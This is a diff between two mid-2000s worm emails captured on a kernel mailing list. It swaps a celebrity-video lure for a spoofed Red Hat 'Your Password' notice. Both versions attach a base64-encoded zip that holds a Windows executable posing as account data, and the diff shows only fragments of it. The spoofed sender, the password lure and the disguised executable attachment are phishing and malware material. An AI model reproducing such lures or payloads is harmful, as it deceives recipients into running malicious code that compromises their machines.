@@ -1,30 +1,29 @@
-From: info@snapgear.com
-Subject: Paris Hilton & Nicole Richie
-Date: Fri, 16 Dec 2005 07:25:41 UTC
-Message-ID: <4c5c8a6eb5e91c92@snapgear.com>
+From: webmaster@redhat.com
+Subject: Your Password
+Date: Fri, 16 Dec 2005 07:33:15 UTC
+Message-ID: <6a9cdb73bcdd3c7c80@redhat.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="abb2a42.08c85ec7"
+Content-Type: multipart/mixed; boundary="be3ea2cb67beb"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: zfreemailer@oss.sgi.com
+To: emailserv@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---abb2a42.08c85ec7
+--be3ea2cb67beb
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---abb2a42.08c85ec7
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.redhat.com
+***** Email: postman@redhat.com
+--be3ea2cb67beb
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---abb2a42.08c85ec7--
+--be3ea2cb67beb--
